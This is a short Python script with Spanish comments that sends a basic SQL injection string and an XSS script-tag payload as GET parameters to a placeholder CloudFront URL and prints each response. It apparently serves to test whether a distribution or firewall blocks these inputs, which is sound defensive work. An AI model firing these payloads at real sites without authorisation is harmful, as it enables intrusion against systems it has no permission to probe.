import requests

# URL de la distribución de CloudFront
cloudfront_url = 'url-de-la-distribucion-cloudfront'

# SQL Injection Payload
sql_injection_payload = "' OR 1=1 --"

# XSS Payload
xss_payload = "<script>alert('XSS')</script>"

def send_attack(url, payload):
    # Enviar la solicitud GET con el payload
    response = requests.get(url, params={'param': payload})
    
    # Imprimir detalles de la solicitud y la respuesta
    print(f"Request URL: {response.url}")
    print(f"Response Code: {response.status_code}")
    print(f"Response Body: {response.text}")

# Simular ataque de SQL Injection
print("Simulating SQL Injection Attack:")
send_attack(cloudfront_url, sql_injection_payload)

# Simular ataque de XSS
print("Simulating XSS Attack:")
send_attack(cloudfront_url, xss_payload)
